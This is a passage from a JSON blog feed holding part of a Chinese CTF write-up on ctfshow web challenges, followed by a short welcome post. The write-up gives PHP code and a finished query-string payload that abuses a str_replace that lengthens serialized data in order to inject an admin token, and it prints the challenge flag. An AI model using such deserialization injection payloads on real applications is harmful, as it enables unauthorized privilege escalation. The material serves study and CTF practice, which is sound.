data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">message</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$from</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'1'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'1'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$to</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$token</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'user'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">message</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token variable\">$str</span> <span class=\"token operator\">=</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token variable\">$str1</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'fuck'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'loveU'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token variable\">$str1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>最终构造payload：</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">?</span>f<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">&amp;</span>m<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">&amp;</span>t<span class=\"token operator\">=</span>fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck<span class=\"token string double-quoted-string\">\";s:5:\"</span>token<span class=\"token string double-quoted-string\">\";s:5:\"</span>admin\"<span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><pre><code>ctfshow&#123;d87728c3-9d2a-469c-829a-690743aae333&#125;\n</code></pre>\n<h1 id=\"java\"><a class=\"anchor\" href=\"#java\">#</a> java</h1>\n<h2 id=\"web279\"><a class=\"anchor\" href=\"#web279\">#</a> web279</h2>\n",
            "tags": [
                "CTF Write Up",
                "CTF"
            ]
        },
        {
            "id": "http://k1nako.github.io/%E6%AC%A2%E8%BF%8E%E6%9D%A5%E5%88%B0%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2/",
            "url": "http://k1nako.github.io/%E6%AC%A2%E8%BF%8E%E6%9D%A5%E5%88%B0%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2/",
            "title": "欢迎来到我的博客",
            "date_published": "2023-04-16T15:14:15.000Z",
            "content_html": "<p><em><strong>这是一个简单的博客，用来记录我的学习笔记</strong></em></p>\n",
            "tags": []
        }
    ]
}